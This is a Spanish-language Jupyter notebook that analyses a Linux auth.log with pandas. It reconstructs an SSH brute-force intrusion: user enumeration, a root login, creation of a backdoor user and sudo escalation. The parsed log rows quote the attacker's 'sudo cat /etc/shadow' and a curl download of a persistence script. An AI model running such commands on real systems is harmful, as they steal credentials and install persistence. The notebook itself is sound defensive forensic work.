# Exploracion del dataset


In [21]:
import matplotlib.pyplot as plt
import pandas as pd
import seaborn as sns


Aca puede ajustar la ruta para para user el arhcivo que quiera realizar la exploracion

In [22]:
import sys
sys.path.append('..')
from src.parser import parse_log

df = parse_log('../data/raw/auth.log') # ruta del archivo
df.head()

,service,date,host,message_type,user,UID,GID,ip_origin,port,pid,group_name,command
0,CRON,1900-03-06 06:18:01,172-31-35-28,session opened,confluence,NaN,NaN,NaN,NaN,1119,NaN,NaN
1,CRON,1900-03-06 06:18:01,172-31-35-28,session opened,confluence,NaN,NaN,NaN,NaN,1118,NaN,NaN
2,CRON,1900-03-06 06:18:01,172-31-35-28,session opened,confluence,NaN,NaN,NaN,NaN,1117,NaN,NaN
3,CRON,1900-03-06 06:18:01,172-31-35-28,session closed,confluence,NaN,NaN,NaN,NaN,1118,NaN,NaN
4,CRON,1900-03-06 06:18:01,172-31-35-28,session closed,confluence,NaN,NaN,NaN,NaN,1119,NaN,NaN


In [23]:
df.info()

<class 'pandas.DataFrame'>
RangeIndex: 385 entries, 0 to 384
Data columns (total 12 columns):
 #   Column        Non-Null Count  Dtype         
---  ------        --------------  -----         
 0   service       370 non-null    str           
 1   date          385 non-null    datetime64[us]
 2   host          385 non-null    str           
 3   message_type  240 non-null    str           
 4   user          283 non-null    str           
 5   UID           1 non-null      str           
 6   GID           1 non-null      str           
 7   ip_origin     215 non-null    str           
 8   port          166 non-null    str           
 9   pid           377 non-null    str           
 10  group_name    2 non-null      str           
 11  command       2 non-null      str           
dtypes: datetime64[us](1), str(11)
memory usage: 36.2 KB


este dataset esta compuesto por 385 filas y 12 columnas donde la mayoria de sus campos son str y solo uno es datatime

In [24]:
df['service'].value_counts()

service
sshd       257
CRON       104
sudo         6
usermod      2
useradd      1
Name: count, dtype: int64

In [ ]:
# separamos en diferentes datasets los servicios encontrados
df_sshd = df[df['service'] == 'sshd'].reset_index()
df_sudo = df[df['service'] == 'sudo'].reset_index()
df_usermod = df[df['service'] == 'usermod'].reset_index()
df_useradd = df[df['service'] == 'useradd'].reset_index()

## sshd

In [26]:
df_sshd.head()
df_sshd_groupby = df_sshd.groupby('ip_origin')['message_type'].value_counts()
df_sshd_groupby

ip_origin      message_type                          
203.101.190.9  Accepted password                          1
65.2.161.68    Invalid user                              34
               Received disconnect                       33
               Failed password for invalid user          33
               Failed password                           15
                Disconnected from authenticating user     6
               PAM 1 more authentication failure          4
               Accepted password                          3
Name: count, dtype: int64

En este caso se aprecia que la ip 65.2.161.68 ha realizado varias cosas por ssh como 34 intentos de loging con usuarios invalidos lo que sugiere un ataque de enumeracion de usaurios mas 33 de contraseña fallida para un usurio invalido, 15 contraseñas fallidas hacia un usuario existente y al final 3 contraseñas aceptadas, lo que suguiere que obtuvo acceso 

In [27]:
df_user_groupby = df.groupby('ip_origin')['user'].value_counts()
df_user_groupby

ip_origin      user       
203.101.190.9  root            1
65.2.161.68    server_adm     36
               svc_account    33
               admin          32
               backup         17
               root           13
               cyberjunkie     1
Name: count, dtype: int64

como se aprecia la ip 65.2.161.68 ha apuntado a varios users donde probablemente intento varias contraseñas hasta que consiguio el acceso

In [39]:
df_ip = df[df['ip_origin'] == '65.2.161.68'].reset_index()
df_ip.head()


,index,service,date,host,message_type,user,UID,GID,ip_origin,port,pid,group_name,command
0,67,sshd,1900-03-06 06:31:31,172-31-35-28,Invalid user,admin,NaN,NaN,65.2.161.68,46380,2325,NaN,NaN
1,68,sshd,1900-03-06 06:31:31,172-31-35-28,Received disconnect,NaN,NaN,NaN,65.2.161.68,46380,2325,NaN,NaN
2,69,sshd,1900-03-06 06:31:31,172-31-35-28,NaN,admin,NaN,NaN,65.2.161.68,46380,2325,NaN,NaN
3,71,sshd,1900-03-06 06:31:31,172-31-35-28,NaN,NaN,NaN,NaN,65.2.161.68,NaN,620,NaN,NaN
4,72,sshd,1900-03-06 06:31:31,172-31-35-28,Invalid user,admin,NaN,NaN,65.2.161.68,46392,2327,NaN,NaN


In [40]:
df_ip=df_ip[df_ip['message_type'] == 'Accepted password']
df_ip

,index,service,date,host,message_type,user,UID,GID,ip_origin,port,pid,group_name,command
179,280,sshd,1900-03-06 06:31:40,172-31-35-28,Accepted password,root,NaN,NaN,65.2.161.68,34782,2411,NaN,NaN
210,321,sshd,1900-03-06 06:32:44,172-31-35-28,Accepted password,root,NaN,NaN,65.2.161.68,53184,2491,NaN,NaN
213,359,sshd,1900-03-06 06:37:34,172-31-35-28,Accepted password,cyberjunkie,NaN,NaN,65.2.161.68,43260,2667,NaN,NaN


Inicio de la actividad de esa ip sospechosa(65.2.161.68) 06:31:31 hasta las 06:31:40 que consigui su primer acceso, tardo 9 seg
Logro acceso como root al sistema y por ultimo al usaurio cyberjunkie

## sudo


In [28]:
df_sudo.head()

,index,service,date,host,message_type,user,UID,GID,ip_origin,port,pid,group_name,command
0,363,sudo,1900-03-06 06:37:57,172-31-35-28,NaN,cyberjunkie,NaN,NaN,NaN,NaN,NaN,NaN,cat /etc/shadow
1,364,sudo,1900-03-06 06:37:57,172-31-35-28,session opened for user root,cyberjunkie,NaN,NaN,NaN,NaN,NaN,NaN,NaN
2,365,sudo,1900-03-06 06:37:57,172-31-35-28,session closed for user root,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
3,374,sudo,1900-03-06 06:39:38,172-31-35-28,NaN,cyberjunkie,NaN,NaN,NaN,NaN,NaN,NaN,curl https://raw.githubusercontent.com/montyse...
4,375,sudo,1900-03-06 06:39:38,172-31-35-28,session opened for user root,cyberjunkie,NaN,NaN,NaN,NaN,NaN,NaN,NaN


Se ve que el usuario cyberjunkie(que anteriormente la ip sospechoza uso) ha usado comandos sudo para mirar una lista de usuarios y hacer un curl

## useradd

In [30]:
df_useradd.head()

,index,service,date,host,message_type,user,UID,GID,ip_origin,port,pid,group_name,command
0,335,useradd,1900-03-06 06:34:18,172-31-35-28,new user,cyberjunkie,1002,1002,NaN,NaN,2592,NaN,NaN


Se ha creado ese usurio como una posible backdor

## usermod

In [29]:
df_usermod.head()

,index,service,date,host,message_type,user,UID,GID,ip_origin,port,pid,group_name,command
0,344,usermod,1900-03-06 06:35:15,172-31-35-28,group,cyberjunkie,NaN,NaN,NaN,NaN,2628,sudo,NaN
1,345,usermod,1900-03-06 06:35:15,172-31-35-28,shadow group,cyberjunkie,NaN,NaN,NaN,NaN,2628,sudo,NaN


Con el usermod ha modificado los privilegios del usuario cyberjunkie para meterlo al grupo sudo 

# Hallazgos clave
1. La IP 65.2.161.68 ejecutó un ataque de fuerza bruta con 48 intentos en 9 segundos
2. Antes de eso, intentó enumerar usuarios probando admin, backup, server_adm, svc_account
3. Logró acceso exitoso como root a las 06:31:40
4. Creó un usuario backdoor llamado cyberjunkie
5. Le otorgó privilegios sudo a ese usuario
6. Usó sudo para leer /etc/shadow y descargar un script de persistencia (linper.sh)